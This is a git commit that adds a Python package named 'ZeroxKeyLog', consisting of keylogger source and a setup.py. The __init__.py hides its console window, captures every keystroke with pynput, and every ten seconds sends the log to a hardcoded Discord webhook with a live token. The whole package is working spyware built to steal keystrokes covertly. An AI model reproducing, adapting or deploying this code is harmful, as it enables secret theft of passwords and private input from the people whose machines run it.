10b455a32ec0e6e9a5f0ca91af2ab0d740dd4053
Zeroxytb06 <105605589+Zeroxytb06@users.noreply.github.com>
2022-07-17 14:07:39 +0200

    Add files via upload

---
+++ __init__.py
@@ -0,0 +1,35 @@
+from pynput.keyboard import Listener
+from threading import Timer
+from dhooks import Webhook
+import win32gui
+import win32con
+win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
+
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/993824492918939698/_IAhXUSoH5aYP5likOjgtqHrQVY0cpWQScIYxRMe169BmwlmATJWgIc_UdplHsbtFMaY"
+TIME_INTERVAL = 10
+
+
+class Keylogger:
+    def __init__(self, webhook_url, interval=60):
+        self.interval = interval
+        self.webhook = Webhook(webhook_url)
+        self.log = ""
+
+    def _report(self):
+        if self.log != '':
+            self.webhook.send(self.log)
+            self.log = ''
+        Timer(self.interval, self._report).start()
+
+    def _on_key_press(self, key):
+        self.log += str(key)
+
+    def run(self):
+        self._report()
+        with Listener(self._on_key_press) as t:
+            t.join()
+
+
+if __name__ == '__main__':
+    Keylogger(WEBHOOK_URL, TIME_INTERVAL).run()
---
+++ setup.py
@@ -0,0 +1,15 @@
+import setuptools
+
+setuptools.setup(
+ name='ZeroxKeyLog',
+ version='0.1',
+ author="Noam Sghaier Weil",
+ author_email="zerox.ytb06@gmail.com",
+ description="Its .pyw file for key log",
+ packages=setuptools.find_packages(),
+ classifiers=[
+ "Programming Language :: Python :: 3",
+ "License :: OSI Approved :: MIT License",
+ "Operating System :: OS Independent",
+ ],
+)
